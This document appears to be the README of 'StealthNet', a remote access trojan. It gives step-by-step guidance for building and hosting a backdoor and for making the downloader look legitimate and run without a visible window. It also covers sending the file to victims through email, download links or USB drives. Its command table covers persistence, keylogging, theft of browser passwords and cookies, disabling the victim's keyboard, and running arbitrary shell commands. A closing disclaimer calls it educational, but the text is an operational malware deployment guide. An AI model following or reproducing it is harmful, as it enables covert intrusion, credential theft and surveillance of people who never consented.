# StealthNet

StealthNet is a remote administration tool that uses reverse connection techniques for remote control of target systems. This repository contains all the necessary components to build, deploy, and manage the connections.

## Quick Start Guide

1. Compile the backdoor using PyInstaller and host it
2. Compile the C++ downloader with the backdoor URL
3. Start the main server
4. Distribute the C++ executable to targets
5. Control connected systems with the Attacker client

## Components

StealthNet consists of several components:
- C++ downloader (`DownloadAndExecute.cpp`) - Initial execution point that downloads and runs the main payload
- Target script (`Target.py`) - Main backdoor functionality for the victim machine
- Main server (`main_server.py`) - Central command server that handles multiple connections
- Attacker client (`Attacker.py`) - Control interface for the operator to manage connected targets
- Browser and Keylogger modules for data extraction

## Setup Instructions

### 1. Compile and Host the Backdoor

1. Install the required dependencies:
   ```
   pip install -r requirement.txt
   ```
2. Convert `Target.py` to an executable:
   ```
   python exe_converter.py
   ```
   Alternatively, use PyInstaller directly:
   ```
   pyinstaller --onefile --noconsole Target.py
   ```
3. Host the generated executable on a web server:
   - Use Python's built-in HTTP server:
     ```
     python -m http.server 80
     ```
   - Or any other hosting method of your choice
   - Note the URL where the file is accessible

### 2. Compile the C++ Downloader

1. Open `DownloadAndExecute.cpp` in Visual Studio
2. Update the download URL in the script to point to your hosted backdoor
3. Make sure to set all the necessary data parameters in the C++ file before compilation
4. Add an appropriate icon for the executable to make it look legitimate:
   - Right-click on the project → Add → Resource → Icon → Import → Select icon file
5. Set up the project for proper compilation:
   - Set the build configuration to Release mode
   - Project → Properties → C/C++ → Code Generation → Runtime Library → Multi-threaded (/MT)
   - Project → Properties → Linker → System → SubSystem → "Windows (/SUBSYSTEM:WINDOWS)" to hide the console window
   - Project → Properties → Linker → Advanced → Entry Point → "mainCRTStartup" (if needed)
6. Compile the executable:
   - Build → Build Solution (F7)
   - The compiled executable will be in the Release folder

### 3. Start the Main Server

1. Ensure SSL certificates are properly set up in the `keys/` directory:
   - Create the necessary key files:
     - ca.key (private key)
     - ca.crt (certificate)
     - ca.csr (certificate signing request)
   - You can generate these with OpenSSL
2. Run the main server:
   ```
   python main_server.py
   ```
3. The server will listen for incoming connections from both targets and attackers

### 4. Distribute the C++ Executable

1. Send the compiled C++ executable to targets using:
   - Email attachments
   - Download links
   - USB drives
   - Other distribution methods
2. When executed on the target system, it will:
   - Download the backdoor payload
   - Execute it silently
   - Establish a connection to your server

### 5. Control Connected Targets

1. Run the attacker client:
   ```
   python Attacker.py
   ```
2. Select a target from the list of connected systems
3. Execute commands to control the remote system

## Available Commands

| Command | Description |
|---------|-------------|
| `exit` | Disconnect from the target |
| `persistent add` | Add startup persistence |
| `persistent remove` | Remove startup persistence |
| `cd [directory]` | Change working directory |
| `download [file]` | Download a file from the target |
| `upload [file]` | Upload a file to the target |
| `keylogger on/off/report` | Control the keylogger |
| `screenshot` | Capture screen of the target |
| `browser passwords` | Extract browser passwords |
| `browser cookies` | Extract browser cookies |
| `disable_keyboard` | Disable the target's keyboard |
| `reboot` | Reboot the target system |
| `change_bakara` | Switch to another connected target |
| Any shell command | Execute shell commands on the target |

## Requirements

All required dependencies are listed in `requirement.txt`. Main dependencies include:
- keyboard
- pandas
- PyAutoGUI
- pycryptodome
- pywin32
- Python 3.x

## Security Notice

This tool is intended for educational purposes and authorized use only. Unauthorized use of this tool against systems without explicit permission is illegal and unethical.